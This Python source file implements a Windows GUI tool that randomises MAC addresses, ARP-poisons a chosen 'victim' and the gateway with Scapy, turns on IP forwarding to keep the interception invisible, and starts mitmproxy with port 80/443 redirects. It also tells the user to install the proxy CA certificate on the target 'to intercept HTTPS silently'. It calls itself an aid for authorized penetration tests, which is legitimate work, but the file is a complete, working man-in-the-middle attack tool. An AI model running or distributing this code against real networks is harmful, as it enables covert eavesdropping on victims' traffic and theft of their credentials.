"""
ARP Spoof / MITM — MAC changer + ARP poisoning for authorized pentests.

Sections
────────
1. MAC Changer  — randomise or set a custom MAC on any local interface
                  (Windows registry + adapter restart)
2. ARP Spoof    — continuous bidirectional ARP poisoning between a target
                  and the gateway so all traffic passes through this machine
                  (Scapy, requires admin + npcap)
3. IP Forwarding — toggle kernel packet forwarding so the MITM is invisible
                   to both ends (they stay connected)

All actions require the app to be running as Administrator.
"""
from __future__ import annotations

import pathlib
import random
import subprocess
import sys
import threading
import time
import webbrowser
import winreg
from typing import Callable, Optional

import customtkinter as ctk
import tkinter as tk

# ── Palette ───────────────────────────────────────────────────────────────────
_BG      = "#0d1117"
_SURFACE = "#161b22"
_BORDER  = "#30363d"
_HI      = "#c9d1d9"
_LO      = "#8b949e"
_GREEN   = "#238636"
_RED     = "#da3633"
_ORANGE  = "#d97706"
_CYAN    = "#58a6ff"

# ── Network helpers ───────────────────────────────────────────────────────────

def _get_interfaces() -> list[dict]:
    """Return list of {name, mac, ip} for real (non-loopback) adapters."""
    try:
        import psutil, socket
        results = []
        stats = psutil.net_if_stats()
        addrs = psutil.net_if_addrs()
        for name, addr_list in addrs.items():
            if name.lower() == "loopback" or "loopback" in name.lower():
                continue
            mac = ""
            ip  = ""
            for a in addr_list:
                addr_str = str(a.address)
                if "-" in addr_str and len(addr_str) == 17:
                    mac = addr_str.replace("-", ":").lower()
                if "." in addr_str and ":" not in addr_str and not addr_str.startswith("169"):
                    ip = addr_str
            if mac and mac != "00:00:00:00:00:00":
                results.append({"name": name, "mac": mac, "ip": ip})
        return results
    except Exception:
        return []


def _random_mac() -> str:
    """Generate a random locally-administered unicast MAC."""
    b = [random.randint(0, 255) for _ in range(6)]
    b[0] = (b[0] & 0xFE) | 0x02   # unicast + locally administered
    return ":".join(f"{x:02x}" for x in b)


def _get_adapter_class_key(guid: str) -> Optional[str]:
    """Find the registry path under Class\\{4D36E972...} for a given adapter GUID."""
    class_path = r"SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}"
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, class_path) as key:
            n = winreg.QueryInfoKey(key)[0]
            for i in range(n):
                try:
                    idx = winreg.EnumKey(key, i)
                    sub = f"{class_path}\\{idx}"
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, sub) as sk:
                        cfg_id = winreg.QueryValueEx(sk, "NetCfgInstanceId")[0]
                        if cfg_id.upper() == guid.upper():
                            return sub
                except Exception:
                    continue
    except Exception:
        pass
    return None


def _get_adapter_guid(friendly_name: str) -> Optional[str]:
    net_path = r"SYSTEM\CurrentControlSet\Control\Network\{4D36E972-E325-11CE-BFC1-08002BE10318}"
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, net_path) as key:
            n = winreg.QueryInfoKey(key)[0]
            for i in range(n):
                try:
                    guid = winreg.EnumKey(key, i)
                    conn = f"{net_path}\\{guid}\\Connection"
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, conn) as ck:
                        name = winreg.QueryValueEx(ck, "Name")[0]
                        if name == friendly_name:
                            return guid
                except Exception:
                    continue
    except Exception:
        pass
    return None


def _change_mac(friendly_name: str, new_mac: str,
                cb: Callable[[str], None]) -> bool:
    mac_clean = new_mac.replace(":", "").replace("-", "").upper()
    if len(mac_clean) != 12:
        cb("[ERROR] Invalid MAC address.\n")
        return False

    guid = _get_adapter_guid(friendly_name)
    if not guid:
        cb(f"[ERROR] GUID not found for '{friendly_name}'.\n")
        return False

    reg_path = _get_adapter_class_key(guid)
    if not reg_path:
        cb(f"[ERROR] Registry key not found for adapter GUID {guid}.\n")
        return False

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0,
                            winreg.KEY_SET_VALUE) as sk:
            winreg.SetValueEx(sk, "NetworkAddress", 0, winreg.REG_SZ, mac_clean)
        cb(f"[+] Registry updated → {new_mac}\n")
    except PermissionError:
        cb("[ERROR] Permission denied — run as Administrator.\n")
        return False

    cb("[*] Restarting adapter…\n")
    subprocess.run(["netsh", "interface", "set", "interface",
                    friendly_name, "disable"], capture_output=True)
    time.sleep(1.5)
    subprocess.run(["netsh", "interface", "set", "interface",
                    friendly_name, "enable"],  capture_output=True)
    time.sleep(2)
    cb(f"[+] MAC changed to {new_mac}\n")
    return True


def _restore_mac(friendly_name: str, cb: Callable[[str], None]) -> None:
    """Remove the NetworkAddress override so hardware MAC is restored."""
    guid = _get_adapter_guid(friendly_name)
    if not guid:
        return
    reg_path = _get_adapter_class_key(guid)
    if not reg_path:
        return
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0,
                            winreg.KEY_SET_VALUE) as sk:
            try:
                winreg.DeleteValue(sk, "NetworkAddress")
            except FileNotFoundError:
                pass
        subprocess.run(["netsh", "interface", "set", "interface",
                        friendly_name, "disable"], capture_output=True)
        time.sleep(1.5)
        subprocess.run(["netsh", "interface", "set", "interface",
                        friendly_name, "enable"],  capture_output=True)
        cb("[+] Original MAC restored.\n")
    except Exception as exc:
        cb(f"[ERROR] Restore MAC: {exc}\n")


def _set_ip_forwarding(enable: bool, cb: Callable[[str], None]) -> None:
    val = "1" if enable else "0"
    subprocess.run([
        "reg", "add",
        r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
        "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", val, "/f"
    ], capture_output=True)
    cb(f"[+] IP forwarding {'enabled' if enable else 'disabled'}.\n")


def _get_mac_of(ip: str, iface_guid: str) -> Optional[str]:
    try:
        from scapy.all import ARP, Ether, srp  # type: ignore
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        ans, _ = srp(pkt, timeout=2, verbose=0, iface=iface_guid)
        if ans:
            return ans[0][1].hwsrc
    except Exception:
        pass
    return None


def _scapy_iface_for(friendly_name: str) -> Optional[str]:
    """Resolve friendly adapter name to Scapy \\Device\\NPF_... string."""
    try:
        from scapy.all import conf  # type: ignore
        for dev_id, iface in conf.ifaces.items():
            fn = getattr(iface, "name", "") or getattr(iface, "description", "")
            if fn == friendly_name:
                return dev_id
    except Exception:
        pass
    return None


# ── mitmproxy helpers ────────────────────────────────────────────────────────

def _mitmweb_exe() -> pathlib.Path:
    """Resolve mitmweb binary next to the current Python executable."""
    return pathlib.Path(sys.executable).parent / "mitmweb.exe"


def _ca_cert_path() -> pathlib.Path:
    return pathlib.Path.home() / ".mitmproxy" / "mitmproxy-ca-cert.pem"


def _add_port_redirect(src_port: int, dst_port: int,
                       cb: Callable[[str], None]) -> None:
    r = subprocess.run([
        "netsh", "interface", "portproxy", "add", "v4tov4",
        f"listenport={src_port}", "listenaddress=0.0.0.0",
        f"connectport={dst_port}", "connectaddress=127.0.0.1",
    ], capture_output=True, text=True)
    if r.returncode == 0:
        cb(f"[+] Port redirect {src_port} → {dst_port} added.\n")
    else:
        cb(f"[!] Port redirect {src_port}: {r.stderr.strip() or 'already exists'}\n")


def _del_port_redirect(src_port: int, cb: Callable[[str], None]) -> None:
    subprocess.run([
        "netsh", "interface", "portproxy", "delete", "v4tov4",
        f"listenport={src_port}", "listenaddress=0.0.0.0",
    ], capture_output=True)
    cb(f"[+] Port redirect {src_port} removed.\n")


# ── Page ──────────────────────────────────────────────────────────────────────

class MITMPage(ctk.CTkFrame):

    def __init__(self, master: ctk.CTkFrame, runner,
                 output_cb: Callable[[str], None]) -> None:
        super().__init__(master, fg_color="transparent")
        self._runner  = runner
        self._out     = output_cb
        self._ifaces  = _get_interfaces()

        self._spoof_stop   = threading.Event()
        self._spoof_thread: Optional[threading.Thread] = None
        self._pkt_count    = 0

        self._build()

    # ── Layout ────────────────────────────────────────────────────────────────

    def _build(self) -> None:
        hdr = ctk.CTkFrame(self, fg_color="transparent")
        hdr.pack(fill="x", padx=24, pady=(20, 10))
        ctk.CTkLabel(hdr, text="ARP Spoof / MITM",
                     font=ctk.CTkFont(size=20, weight="bold")).pack(side="left")
        ctk.CTkLabel(hdr, text="  —  MAC changer · ARP poisoning · SSL intercept",
                     text_color=_LO, font=ctk.CTkFont(size=12)).pack(side="left")

        # Top row — MAC changer + ARP spoof
        body = ctk.CTkFrame(self, fg_color="transparent")
        body.pack(fill="x", padx=24, pady=(0, 8))
        body.grid_columnconfigure(0, weight=1)
        body.grid_columnconfigure(1, weight=1)
        body.grid_rowconfigure(0, weight=1)

        self._build_mac_card(body)
        self._build_spoof_card(body)

        # Bottom row — mitmproxy SSL interceptor
        self._build_mitmproxy_card()

    def _card(self, parent, title: str, col: int) -> ctk.CTkFrame:
        card = ctk.CTkFrame(parent, fg_color=_SURFACE, corner_radius=8,
                            border_width=1, border_color=_BORDER)
        card.grid(row=0, column=col, sticky="nsew",
                  padx=(0, 8) if col == 0 else (8, 0))
        card.grid_columnconfigure(0, weight=1)
        ctk.CTkLabel(card, text=title,
                     font=ctk.CTkFont(size=11, weight="bold"),
                     text_color=_LO).grid(row=0, column=0, sticky="w",
                                          padx=18, pady=(16, 0))
        ctk.CTkFrame(card, height=1, fg_color=_BORDER).grid(
            row=1, column=0, sticky="ew", padx=18, pady=(6, 14))
        return card

    # ── MAC Changer ───────────────────────────────────────────────────────────

    def _build_mac_card(self, parent: ctk.CTkFrame) -> None:
        card = self._card(parent, "MAC CHANGER", 0)
        row = 2

        # Interface selector
        ctk.CTkLabel(card, text="Interface", text_color=_LO,
                     font=ctk.CTkFont(family="Consolas", size=11)
                     ).grid(row=row, column=0, sticky="w", padx=18)
        row += 1

        iface_names = [i["name"] for i in self._ifaces] or ["(no interfaces)"]
        self._iface_var = ctk.StringVar(value=iface_names[0])
        ctk.CTkComboBox(card, variable=self._iface_var,
                        values=iface_names, state="readonly",
                        font=ctk.CTkFont(family="Consolas", size=12),
                        command=self._on_iface_change
                        ).grid(row=row, column=0, sticky="ew",
                               padx=18, pady=(4, 12))
        row += 1

        # Current MAC display
        ctk.CTkLabel(card, text="Current MAC", text_color=_LO,
                     font=ctk.CTkFont(family="Consolas", size=11)
                     ).grid(row=row, column=0, sticky="w", padx=18)
        row += 1
        self._cur_mac_var = ctk.StringVar(
            value=self._ifaces[0]["mac"] if self._ifaces else "—")
        ctk.CTkLabel(card, textvariable=self._cur_mac_var,
                     font=ctk.CTkFont(family="Consolas", size=13),
                     text_color=_CYAN
                     ).grid(row=row, column=0, sticky="w", padx=18, pady=(2, 12))
        row += 1

        # New MAC entry
        ctk.CTkLabel(card, text="New MAC", text_color=_LO,
                     font=ctk.CTkFont(family="Consolas", size=11)
                     ).grid(row=row, column=0, sticky="w", padx=18)
        row += 1
        mac_row = ctk.CTkFrame(card, fg_color="transparent")
        mac_row.grid(row=row, column=0, sticky="ew", padx=18, pady=(4, 12))
        mac_row.grid_columnconfigure(0, weight=1)
        self._new_mac_var = ctk.StringVar(value=_random_mac())
        ctk.CTkEntry(mac_row, textvariable=self._new_mac_var,
                     font=ctk.CTkFont(family="Consolas", size=12)
                     ).grid(row=0, column=0, sticky="ew", padx=(0, 6))
        ctk.CTkButton(mac_row, text="Random", width=72,
                      fg_color=_SURFACE, hover_color=_BORDER,
                      border_width=1, border_color=_BORDER,
                      text_color=_HI, font=ctk.CTkFont(size=11),
                      command=lambda: self._new_mac_var.set(_random_mac())
                      ).grid(row=0, column=1)
        row += 1

        # Buttons
        ctk.CTkButton(card, text="Change MAC",
                      fg_color=_GREEN, hover_color="#2ea043",
                      font=ctk.CTkFont(size=13, weight="bold"),
                      command=self._change_mac
                      ).grid(row=row, column=0, sticky="ew", padx=18, pady=(0, 8))
        row += 1
        ctk.CTkButton(card, text="Restore Original MAC",
                      fg_color=_SURFACE, hover_color=_BORDER,
                      border_width=1, border_color=_BORDER,
                      text_color=_HI, font=ctk.CTkFont(size=12),
                      command=self._restore_mac
                      ).grid(row=row, column=0, sticky="ew", padx=18, pady=(0, 16))

    def _on_iface_change(self, name: str) -> None:
        for i in self._ifaces:
            if i["name"] == name:
                self._cur_mac_var.set(i["mac"])
                break

    def _change_mac(self) -> None:
        if self._runner.is_running:
            self._out("[!] Stop current task first.\n")
            return
        name    = self._iface_var.get()
        new_mac = self._new_mac_var.get().strip()
        def do() -> int:
            _change_mac(name, new_mac, self._out)
            self.after(0, lambda: self._ifaces.__setitem__(
                next((i for i, x in enumerate(self._ifaces) if x["name"] == name), 0),
                {**next((x for x in self._ifaces if x["name"] == name), {}), "mac": new_mac}
            ))
            self.after(0, lambda: self._cur_mac_var.set(new_mac))
            return 0
        self._runner.run(do, output_cb=self._out, tool_name="MAC Changer")

    def _restore_mac(self) -> None:
        if self._runner.is_running:
            self._out("[!] Stop current task first.\n")
            return
        name = self._iface_var.get()
        def do() -> int:
            _restore_mac(name, self._out)
            return 0
        self._runner.run(do, output_cb=self._out, tool_name="MAC Restore")

    # ── ARP Spoof ─────────────────────────────────────────────────────────────

    def _build_spoof_card(self, parent: ctk.CTkFrame) -> None:
        card = self._card(parent, "ARP SPOOF  /  MITM", 1)
        row = 2

        def lbl(text):
            ctk.CTkLabel(card, text=text, text_color=_LO,
                         font=ctk.CTkFont(family="Consolas", size=11)
                         ).grid(row=row, column=0, sticky="w", padx=18)

        def entry(var):
            ctk.CTkEntry(card, textvariable=var,
                         font=ctk.CTkFont(family="Consolas", size=12)
                         ).grid(row=row, column=0, sticky="ew",
                                padx=18, pady=(4, 12))

        # Load active target from config
        import json, pathlib
        cfg_path = pathlib.Path.home() / ".cybersuite" / "config.json"
        saved_target = ""
        if cfg_path.exists():
            try:
                saved_target = json.loads(cfg_path.read_text()).get("active_target", "")
            except Exception:
                pass

        lbl("Target IP  (victim)")
        row += 1
        self._target_var = ctk.StringVar(value=saved_target)
        entry(self._target_var)
        row += 1

        lbl("Gateway IP  (router)")
        row += 1
        gw = ""
        if self._ifaces:
            ip = self._ifaces[0].get("ip", "")
            if ip:
                parts = ip.split(".")
                gw = f"{parts[0]}.{parts[1]}.{parts[2]}.1"
        self._gateway_var = ctk.StringVar(value=gw)
        entry(self._gateway_var)
        row += 1

        lbl("Interface")
        row += 1
        iface_names = [i["name"] for i in self._ifaces] or ["(no interfaces)"]
        self._spoof_iface_var = ctk.StringVar(value=iface_names[0])
        ctk.CTkComboBox(card, variable=self._spoof_iface_var,
                        values=iface_names, state="readonly",
                        font=ctk.CTkFont(family="Consolas", size=12)
                        ).grid(row=row, column=0, sticky="ew",
                               padx=18, pady=(4, 12))
        row += 1

        # IP forwarding toggle
        self._fwd_var = ctk.BooleanVar(value=True)
        ctk.CTkCheckBox(card, text="Enable IP forwarding (invisible MITM)",
                        variable=self._fwd_var,
                        font=ctk.CTkFont(family="Consolas", size=11),
                        text_color=_HI
                        ).grid(row=row, column=0, sticky="w", padx=18, pady=(0, 14))
        row += 1

        # Status counter
        self._pkt_lbl = ctk.CTkLabel(card, text="Packets sent: —",
                                     font=ctk.CTkFont(family="Consolas", size=11),
                                     text_color=_LO)
        self._pkt_lbl.grid(row=row, column=0, sticky="w", padx=18, pady=(0, 8))
        row += 1

        self._spoof_status = ctk.CTkLabel(card, text="Idle",
                                          font=ctk.CTkFont(family="Consolas", size=11),
                                          text_color=_LO)
        self._spoof_status.grid(row=row, column=0, sticky="w", padx=18, pady=(0, 14))
        row += 1

        # Buttons
        self._start_btn = ctk.CTkButton(
            card, text="▶  Start MITM",
            fg_color=_RED, hover_color="#b91c1c",
            font=ctk.CTkFont(size=13, weight="bold"),
            command=self._start_spoof,
        )
        self._start_btn.grid(row=row, column=0, sticky="ew", padx=18, pady=(0, 8))
        row += 1

        self._stop_btn = ctk.CTkButton(
            card, text="◼  Stop + Restore ARP",
            fg_color=_SURFACE, hover_color=_BORDER,
            border_width=1, border_color=_BORDER,
            text_color=_HI, font=ctk.CTkFont(size=12),
            state="disabled",
            command=self._stop_spoof,
        )
        self._stop_btn.grid(row=row, column=0, sticky="ew", padx=18, pady=(0, 16))

    # ── Spoof logic ───────────────────────────────────────────────────────────

    def _start_spoof(self) -> None:
        target  = self._target_var.get().strip()
        gateway = self._gateway_var.get().strip()
        iface_name = self._spoof_iface_var.get()

        if not target or not gateway:
            self._out("[ERROR] Enter both target IP and gateway IP.\n")
            return
        if target == gateway:
            self._out("[ERROR] Target and gateway cannot be the same IP.\n")
            return

        scapy_iface = _scapy_iface_for(iface_name)
        if not scapy_iface:
            self._out(f"[ERROR] Cannot resolve Scapy interface for '{iface_name}'.\n")
            return

        self._out(f"\n{'='*60}\nARP Spoof — {target} ↔ {gateway}\n{'='*60}\n")
        self._out("[*] Resolving MACs…\n")

        target_mac  = _get_mac_of(target,  scapy_iface)
        gateway_mac = _get_mac_of(gateway, scapy_iface)

        if not target_mac:
            self._out(f"[ERROR] Cannot resolve MAC for target {target}.\n")
            return
        if not gateway_mac:
            self._out(f"[ERROR] Cannot resolve MAC for gateway {gateway}.\n")
            return

        self._out(f"[+] Target:  {target}  →  {target_mac}\n")
        self._out(f"[+] Gateway: {gateway}  →  {gateway_mac}\n")

        if self._fwd_var.get():
            _set_ip_forwarding(True, self._out)

        self._out("[*] Starting ARP poisoning loop (every 2 s)…\n")

        self._spoof_stop.clear()
        self._pkt_count = 0
        self._start_btn.configure(state="disabled")
        self._stop_btn.configure(state="normal")
        self._spoof_status.configure(
            text=f"ACTIVE  {target} ↔ {gateway}", text_color="#f85149")

        def _loop() -> None:
            try:
                from scapy.all import ARP, send  # type: ignore
            except ImportError:
                self._out("[ERROR] Scapy not available.\n")
                return

            while not self._spoof_stop.is_set():
                try:
                    # Tell target: gateway's IP is at our MAC
                    send(ARP(op=2, pdst=target,  hwdst=target_mac,  psrc=gateway),
                         verbose=0, iface=scapy_iface)
                    # Tell gateway: target's IP is at our MAC
                    send(ARP(op=2, pdst=gateway, hwdst=gateway_mac, psrc=target),
                         verbose=0, iface=scapy_iface)
                    self._pkt_count += 2
                    self.after(0, lambda c=self._pkt_count:
                               self._pkt_lbl.configure(text=f"Packets sent: {c}"))
                except Exception as exc:
                    self._out(f"[ERROR] {exc}\n")
                    break
                self._spoof_stop.wait(2)

            # Restore ARP tables
            self._out("[*] Restoring ARP tables…\n")
            try:
                from scapy.all import ARP, send  # type: ignore
                for _ in range(5):
                    send(ARP(op=2, pdst=target,  hwdst=target_mac,
                             psrc=gateway, hwsrc=gateway_mac),
                         verbose=0, iface=scapy_iface)
                    send(ARP(op=2, pdst=gateway, hwdst=gateway_mac,
                             psrc=target,  hwsrc=target_mac),
                         verbose=0, iface=scapy_iface)
            except Exception:
                pass

            if self._fwd_var.get():
                _set_ip_forwarding(False, self._out)

            self._out("[+] ARP tables restored. Attack stopped.\n")
            self.after(0, self._reset_spoof_ui)

        self._spoof_thread = threading.Thread(target=_loop, daemon=True)
        self._spoof_thread.start()

    def _stop_spoof(self) -> None:
        self._spoof_stop.set()
        self._stop_btn.configure(state="disabled")
        self._spoof_status.configure(text="Stopping…", text_color=_ORANGE)

    def _reset_spoof_ui(self) -> None:
        self._start_btn.configure(state="normal")
        self._stop_btn.configure(state="disabled")
        self._spoof_status.configure(text="Stopped", text_color=_LO)

    # ── mitmproxy card ────────────────────────────────────────────────────────

    def _build_mitmproxy_card(self) -> None:
        card = ctk.CTkFrame(self, fg_color=_SURFACE, corner_radius=8,
                            border_width=1, border_color=_BORDER)
        card.pack(fill="x", padx=24, pady=(0, 16))
        card.grid_columnconfigure((0, 1, 2, 3, 4, 5), weight=1)

        ctk.CTkLabel(card, text="SSL INTERCEPTOR  (mitmproxy)",
                     font=ctk.CTkFont(size=11, weight="bold"),
                     text_color=_LO).grid(
            row=0, column=0, columnspan=6, sticky="w", padx=18, pady=(14, 0))
        ctk.CTkFrame(card, height=1, fg_color=_BORDER).grid(
            row=1, column=0, columnspan=6, sticky="ew", padx=18, pady=(6, 12))

        # Row 2 — config fields
        ctk.CTkLabel(card, text="Proxy port:", text_color=_LO,
                     font=ctk.CTkFont(family="Consolas", size=11)
                     ).grid(row=2, column=0, sticky="e", padx=(18, 4))
        self._proxy_port = ctk.StringVar(value="8080")
        ctk.CTkEntry(card, textvariable=self._proxy_port, width=70,
                     font=ctk.CTkFont(family="Consolas", size=12)
                     ).grid(row=2, column=1, sticky="w", padx=(0, 16))

        ctk.CTkLabel(card, text="Web UI port:", text_color=_LO,
                     font=ctk.CTkFont(family="Consolas", size=11)
                     ).grid(row=2, column=2, sticky="e", padx=(0, 4))
        self._webui_port = ctk.StringVar(value="8081")
        ctk.CTkEntry(card, textvariable=self._webui_port, width=70,
                     font=ctk.CTkFont(family="Consolas", size=12)
                     ).grid(row=2, column=3, sticky="w", padx=(0, 16))

        self._redirect_var = ctk.BooleanVar(value=True)
        ctk.CTkCheckBox(card,
                        text="Auto-redirect ports 80 + 443 → proxy (transparent intercept)",
                        variable=self._redirect_var,
                        font=ctk.CTkFont(family="Consolas", size=11),
                        text_color=_HI
                        ).grid(row=2, column=4, columnspan=2, sticky="w", padx=(0, 18))

        # Row 3 — buttons + status
        btn_row = ctk.CTkFrame(card, fg_color="transparent")
        btn_row.grid(row=3, column=0, columnspan=6, sticky="ew",
                     padx=18, pady=(10, 14))

        self._mitm_start_btn = ctk.CTkButton(
            btn_row, text="▶  Start mitmweb", width=150,
            fg_color=_GREEN, hover_color="#2ea043",
            font=ctk.CTkFont(size=13, weight="bold"),
            command=self._start_mitmweb,
        )
        self._mitm_start_btn.pack(side="left", padx=(0, 8))

        self._mitm_stop_btn = ctk.CTkButton(
            btn_row, text="◼  Stop", width=90,
            fg_color=_SURFACE, hover_color=_BORDER,
            border_width=1, border_color=_BORDER,
            text_color=_HI, font=ctk.CTkFont(size=12),
            state="disabled",
            command=self._stop_mitmweb,
        )
        self._mitm_stop_btn.pack(side="left", padx=(0, 16))

        self._webui_btn = ctk.CTkButton(
            btn_row, text="⎋  Open Web UI", width=130,
            fg_color=_SURFACE, hover_color=_BORDER,
            border_width=1, border_color=_CYAN,
            text_color=_CYAN, font=ctk.CTkFont(size=12),
            state="disabled",
            command=self._open_webui,
        )
        self._webui_btn.pack(side="left", padx=(0, 16))

        self._cert_btn = ctk.CTkButton(
            btn_row, text="📋  Copy CA cert path", width=150,
            fg_color=_SURFACE, hover_color=_BORDER,
            border_width=1, border_color=_BORDER,
            text_color=_LO, font=ctk.CTkFont(size=11),
            command=self._copy_cert_path,
        )
        self._cert_btn.pack(side="left", padx=(0, 16))

        self._mitm_status = ctk.CTkLabel(
            btn_row, text="Idle — start mitmweb then begin ARP spoof",
            text_color=_LO, font=ctk.CTkFont(family="Consolas", size=11))
        self._mitm_status.pack(side="left", padx=8)

        self._mitm_proc: Optional[subprocess.Popen] = None

    def _start_mitmweb(self) -> None:
        proxy_port = self._proxy_port.get().strip()
        webui_port = self._webui_port.get().strip()
        exe = _mitmweb_exe()

        if not exe.exists():
            self._out(f"[ERROR] mitmweb not found at {exe}\n")
            return

        cmd = [str(exe),
               "--listen-port",  proxy_port,
               "--web-port",     webui_port,
               "--no-web-open-browser"]

        self._out(f"\n{'='*60}\nmitmweb  proxy:{proxy_port}  webui:{webui_port}\n{'='*60}\n")
        try:
            self._mitm_proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1,
            )
        except Exception as exc:
            self._out(f"[ERROR] Failed to start mitmweb: {exc}\n")
            return

        self._mitm_start_btn.configure(state="disabled")
        self._mitm_stop_btn.configure(state="normal")
        self._webui_btn.configure(state="normal")
        self._mitm_status.configure(
            text=f"Running on :{proxy_port}  ·  Web UI: http://127.0.0.1:{webui_port}",
            text_color="#3fb950")

        if self._redirect_var.get():
            self._out("[*] Adding port redirects…\n")
            _add_port_redirect(80,  int(proxy_port), self._out)
            _add_port_redirect(443, int(proxy_port), self._out)

        self._out(f"[+] mitmweb started. Web UI → http://127.0.0.1:{webui_port}\n")
        self._out("[*] CA cert: install ~/.mitmproxy/mitmproxy-ca-cert.pem on the target\n")
        self._out("    to avoid browser cert warnings.\n")

        # Tail mitmweb output in background
        def _tail() -> None:
            for line in self._mitm_proc.stdout:
                self._out(line)
        threading.Thread(target=_tail, daemon=True).start()

    def _stop_mitmweb(self) -> None:
        proxy_port = self._proxy_port.get().strip()
        if self._mitm_proc:
            self._mitm_proc.terminate()
            self._mitm_proc = None

        if self._redirect_var.get():
            _del_port_redirect(80,  self._out)
            _del_port_redirect(443, self._out)

        self._mitm_start_btn.configure(state="normal")
        self._mitm_stop_btn.configure(state="disabled")
        self._webui_btn.configure(state="disabled")
        self._mitm_status.configure(text="Stopped", text_color=_LO)
        self._out("[+] mitmweb stopped.\n")

    def _open_webui(self) -> None:
        webbrowser.open(f"http://127.0.0.1:{self._webui_port.get()}")

    def _copy_cert_path(self) -> None:
        cert = _ca_cert_path()
        self.clipboard_clear()
        self.clipboard_append(str(cert))
        self._out(f"[+] CA cert path copied: {cert}\n")
        self._out("[*] Install this cert on the target device to intercept HTTPS silently.\n")
